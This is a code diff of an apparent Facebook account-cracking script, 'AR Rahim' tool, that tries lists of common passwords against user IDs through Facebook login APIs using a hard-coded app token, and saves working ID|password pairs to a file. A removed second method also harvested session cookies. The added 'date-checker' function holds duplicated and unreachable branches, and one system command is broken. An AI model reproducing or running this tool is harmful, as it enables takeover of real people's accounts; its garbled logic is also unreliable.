@@ -171,6 +171,89 @@ def Rahim_all():
     """
     return random.choice([Rahim_1(), Rahim_2(), Rahim_3()])
     
+    #-------------------[ DATE-CHECKER ]-----------------#
+def Rahimx(fx):
+    if len(fx) == 20:
+        if fx[:10] in ['1000000000']:
+            Rahimxz = '2013/2014'
+            return Rahimxz
+        if fx[:9] in ['100000000']:
+            Rahimxz = '2013/2014'
+            return Rahimxz
+        if fx[:8] in ['10000000', '10000001', '10000002', '10000003', '10000004', '10000005']:
+            Rahimxz = '2014'
+            return Rahimxz
+        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
+            Rahimxz = '2013'
+            return Rahimxz
+        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
+            Rahimxz = '2014/2015'
+            return Rahimxz
+        if fx[:6] in ['100001']:
+            Rahimxz = '2014/2015'
+            return Rahimxz
+        if fx[:6] in ['100002', '100003']:
+            Rahimxz = '2014/2015'
+            return Rahimxz
+        if fx[:6] in ['100004']:
+            Rahimxz = '2014/2015'
+            return Rahimxz
+        if fx[:6] in ['100004']:
+            Rahimxz = '2012/2013'
+            return Rahimxz
+        if fx[:6] in ['100004']:
+            Rahimxz = '2012/2013'
+            return Rahimxz
+        if fx[:6] in ['100005', '100006']:
+            Rahimxz = '2013/2014'
+            return Rahimxz
+        if fx[:6] in ['100007', '100008']:
+            Rahimxz = '2014/2015'
+            return Rahimxz
+        if fx[:6] in ['100009']:
+            Rahimxz = '2012'
+            return Rahimxz
+        if fx[:5] in ['10001']:
+            Rahimxz = '2013'
+            return Rahimxz
+        if fx[:5] in ['10002']:
+            Rahimxz = '2014'
+            return Rahimxz
+        if fx[:5] in ['10003']:
+            Rahimxz = '2013'
+        if fx[:5] in ['10004']:
+            Rahimxz = '2013'
+            return Rahimxz
+        if fx[:5] in ['10005']:
+            Rahimxz = '2012'
+            return Rahimxz
+        if fx[:5] in ['10006', '10007', '10008']:
+            Rahimxz = '2014/2015'
+            return Rahimxz
+        Rahimxz = '2012'
+        return Rahimxz
+        if fx[:5] in ['10004']:
+            Rahimxz = '2013/2014'
+            return Rahimxz
+        if fx[:5] in ['10005']:
+            Rahimxz = '2012'
+            return Rahimxz
+        if fx[:5] in ['10006', '10007', '10008']:
+            Rahimxz = '2011/2012'
+            return Rahimxz
+        Rahimxz = '2012'
+        return Rahimxz
+    if len(fx) in [11, 12]:
+        Rahimxz = '2011/2012'
+        return Rahimxz
+    if len(fx) == 14:
+        Rahimxz = '2014'
+        return Rahimxz
+    if len(fx) == 15:
+        Rahimxz = '2015'
+        return Rahimxz
+    Rahimxz = '2014/2015'
+    return Rahimxz
 #-_-_-_-_-_-_-_-<-LOGO->-_-_-_-_-_-_-_-#
 from datetime import datetime
 
@@ -178,9 +261,7 @@ from datetime import datetime
 now = datetime.now()
 formatted_date = now.strftime("%d/%B/%Y")
 formatted_time = now.strftime("%I:%M:%S %p")
-
-os.system('xdg-open https://t.me/rahimking2034')
-os.system('clear');os.system('espeak -a 300 "well,come to, AR Rahim free tool"')
+os.system('clear');os.system('welcome,to, AR, Rahim , King , Server, thanks"')
 os.system('pkg update')
 
 logo = (f"""
@@ -224,8 +305,7 @@ def main():
     lin()
     ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
     lin()
-    print(f"{g}[{r}1{g}] {w}METHOD {r}[{g}A{r}]")
-    print(f"{g}[{r}2{g}] {w}METHOD {r}[{g}B{r}]{g}")
+    print(f"{g}[{r}1{g}] {w}METHOD {r}[{g}1{r}]")
     lin()
     mtd_opt = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
     lin()
@@ -281,29 +361,25 @@ def login(uid, tl):
         sys.stdout.write(f"\r➤ {g}Rahim{r}-{g}Rahim {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
         sys.stdout.flush()
         for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
-            chosen_ua = Rahim_all()
-            headers = {
-                'authority': 'm.facebook.com',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                'accept-language': 'en-US,en;q=0.9',
-                'cache-control': 'max-age=0',
-                'dpr': '1.8000000715255737',
-                'sec-ch-prefers-color-scheme': 'light',
-                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-                'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-model': '"V2111"',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-ch-ua-platform-version': '"12.0.0"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'none',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-                'viewport-width': '980',
-            }
-            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
+             chosen_ua = Rahim_all()
+             headers = {
+             "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+             "Content-Type": "application/x-www-form-urlencoded",
+             "Host": "graph.facebook.com",
+             "X-FB-Net-HNI": "47001",
+             "X-FB-SIM-HNI": "47001",
+             "X-FB-Connection-Type": "MOBILE.LTE",
+             "X-Tigon-Is-Retry": "False",
+             "x-fb-session-id": "nid=27Y5JlHQUYfw;pid=Main;tid=751;",
+             "x-fb-device-group": "5120",
+             "X-FB-Friendly-Name": "ViewerReactionsMutation",
+             "X-FB-Request-Analytics-Tags": "graphservice",
+             "X-FB-HTTP-Engine": "Liger",
+             "X-FB-Client-IP": "True",
+             "X-FB-Server-Cluster": "True",
+             "x-fb-connection-token": "3d86a6aea98013a526930c84c9b7cd0d"
+         }
+             url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                    str(uid) + '&password=' + str(pw) + 
                    '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                    '&error_detail_type=button_with_disabled&source=device_based_login' +
@@ -311,105 +387,25 @@ def login(uid, tl):
                    '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                    'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                    '&fb_api_req_friendly_name=authenticate&cpl=true')
-            rp = requests.get(url, headers=headers).json()
-            if "session_key" in rp:
+             rp = requests.get(url, headers=headers).json()
+             if "session_key" in rp:
                 print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                 open("/sdcard/Rahim-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
-            elif "Please Confirm Email" in str(rp):
+             elif "Please Confirm Email" in str(rp):
                 print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                 open("/sdcard/Rahim-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
-            else:
+             else:
                 continue
         loop += 1
     except requests.exceptions.ConnectionError:
         time.sleep(30)
     except Exception as e:
         pass
-#----------------------------[METHOD 2]-----------------------------------#
-def login1(uid, tl):
-    global oks, loop
-    try:
-        sys.stdout.write(f"\r➤Rahim{r}-{g}Rahim {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
-        sys.stdout.flush()
-        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
 
-            url = 'https://graph.facebook.com/auth/login'
-
-            ua_list2 = ua_2009_2016(100)
-            ua_list = Rahim_all()
-            headers = {
-                'authority': 'm.facebook.com',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                'accept-language': 'en-US,en;q=0.9',
-                'cache-control': 'max-age=0',
-                'dpr': '1.8000000715255737',
-                'sec-ch-prefers-color-scheme': 'light',
-                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-                'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-model': '"V2111"',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-ch-ua-platform-version': '"12.0.0"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'none',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-                'viewport-width': '980',
-            }
-            data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'email': uid,
-                'password': pw,
-                'generate_analytics_claims': '1',
-                'community_id': '',
-                'cpl': 'true',
-                'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'password',
-                'source': 'login',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'false',
-                'generate_session_cookies': '1',
-                'generate_machine_id': '1',
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'fb_api_req_friendly_name': 'authenticate',
-                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-            }
-            rp = requests.post(url, headers=headers, data=data).json()
-            if "session_key" in rp:
-                cookie = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
-                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
-                try:
-                    print(f"\r\r{r}[{g}COOKIES 🍪{r}]{p}➤ {w}{cookie}")
-                    lin()
-                except(KeyError, IOError):
-                    pass
-                open("/sdcard/Rahim-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
-                break 
-            elif "Please Confirm Email" in str(rp):
-                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
-                open("/sdcard/Rahim-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
-                break
-            else:
-                continue
-        loop += 1
-    except requests.exceptions.ConnectionError:
-        time.sleep(30)
-    except Exception as e:
-        pass
 #----------------------------[APPROVAL]-----------------------------------#
 #----------------------------[APPROVAL SYSTEM - GITHUB]-----------------------------------#
 def approval():
@@ -440,3 +436,4 @@ time.sleep(2)
 approval()        
 
 #----------------------------[CODE/END]-----------------------------------#
+        
